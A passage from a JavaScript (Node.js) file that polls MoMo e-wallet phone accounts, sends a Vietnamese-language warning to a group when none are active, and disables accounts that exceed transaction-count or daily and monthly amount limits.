                await CheckGd(phone, dateString, setting)
                //await timer(1500)


            } catch (error) {

            }
        }
    }
}



async function AutoGetNoti() {
    const phones = await Momo.find({ status: 1 })
    const setting = await Setting.findOne({})
    if (phones.length <= 0) {
        await BotWarning.sendMessage(groupIDwarning, "HẾT SỐ RỒI")
        return
    }
    for (const element of phones) {
        const phone = element
        if (phone.solan >= 190 || phone.gioihanngay >= 45000000 || phone.gioihanthang > 98000000) {
            sendMessGroup(phone.phone + " đã tắt")
            await Momo.findByIdAndUpdate(phone._id, { status: 0 })
        }
        else {
            await CheckGd2(phone, setting)
        }
    }
}







module.exports = { CheckGd }